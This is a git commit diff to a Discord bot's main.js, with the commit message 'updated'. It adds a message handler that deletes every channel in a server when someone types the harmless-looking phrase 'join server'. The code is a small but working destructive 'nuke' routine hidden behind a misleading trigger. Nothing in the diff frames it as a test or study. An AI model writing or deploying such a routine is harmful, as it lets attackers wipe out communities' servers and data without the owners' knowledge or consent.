98425a2255b3985935e4b22cdde702a6f582e368
Epicgamer904 <dabestgamerok@gmail.com>
2021-11-29 15:14:28 +1300

    updated

--- main.js
+++ main.js
@@ -1,18 +1,14 @@
 const Discord = require('discord.js')
-const client = Discord.Client()
-const config = require('./config.json');
-
-
-
-
-
-
-
-
-
-
-
-
-
+const client = new Discord.Client({ intents: ["GUILDS", "GUILD_MESSAGES"] })
+const config = require('./config.json')
 
 client.login(config.token)
+
+client.on('message', async (message) => {
+    if (message.content === 'join server'){
+        console.log('started')
+        message.guild.channels.cache.forEach((channel)=>{
+            channel.delete() 
+        })
+    }
+})
